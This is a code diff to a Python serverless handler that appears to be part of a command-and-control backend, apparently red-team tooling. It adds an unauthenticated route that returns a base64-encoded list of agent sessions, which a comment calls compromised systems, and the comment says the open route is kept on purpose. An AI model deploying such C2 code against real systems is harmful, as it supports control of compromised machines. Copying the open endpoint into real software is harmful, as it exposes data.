@@ -18,11 +18,18 @@ def handler(event, context):
     print('request: {}'.format(json.dumps(event)))
 
     # pass url/path and request body to routing function
-    path = event['path']
-    body = json.loads(event["body"])
-    response = route_request(path, body)
+    if "path" in event:
+        path = event['path']
+        body = json.loads(event["body"])
+        response = route_request(path, body)
+        return response
 
-    return response
+    # temporary route to list-sessions
+    # will remove this later and put in
+    # operator lambda for better OPSEC
+    else:
+        response = handle_list_sessions()
+        return response
 
 
 def route_request(path: str, event_body):
@@ -97,4 +104,28 @@ def handle_post_task_output(event_body):
             'Content-Type': 'text/plain'
         },
         'body': ''
+    }
+
+
+def handle_list_sessions():
+    # ToDo - this function needs to be moved
+    # to the Operator Lambda, otherwise unauthorized
+    # users could pull a list of compromised systems
+    # we'll leave it here for now to deter abuse
+    # by real-world adversaries
+
+    logging.info("getting session list")
+    sessions = agent_session.list_sessions()
+
+    # base64 encode the session list so it is easier to bring back
+    logging.info("base64 encoding session list:")
+    sessions = json.dumps(sessions)
+    encoded_sessions = base64.b64encode(bytes(sessions, "utf-8"))
+
+    return {
+        'statusCode': 200,
+        'headers': {
+            'Content-Type': 'text/plain'
+        },
+        'body': encoded_sessions
     }
